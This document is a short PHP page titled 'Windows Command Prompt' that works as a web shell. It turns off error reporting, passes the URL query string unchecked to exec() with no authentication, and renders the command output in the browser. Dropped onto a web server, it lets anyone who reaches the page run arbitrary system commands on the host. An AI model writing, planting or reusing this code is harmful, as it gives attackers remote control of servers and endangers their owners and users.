<?php
ini_set("error_reporting", 0);
ini_set('display_errors', false);

session_start();
if (!$_SERVER["QUERY_STRING"]){ unset($_SESSION["window_output"]); }

function WindowsCmd($cmd){
  $tmp = exec($cmd, $output);
  
  $_SESSION["window_output"] .= '>'.$cmd.'<br/>';
  foreach ($output as $line){ $_SESSION["window_output"] .= $line.'<br/>'; }
  $_SESSION["window_output"] .= '<br/><br/>';
  
  return $_SESSION["window_output"].'<br/><br/>';
}
?><!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>
		Windows Command Prompt
	</title>
	<style>
	body{background-color:black; color:white; font-family:monospace; font-size:12px;}
	</style>
</head>
<body>
<?php echo WindowsCmd($_SERVER["QUERY_STRING"]); ?>
</body>
</html>
<script>
// scroll to bottom after content renders
window.scrollBy(0,999);
</script>
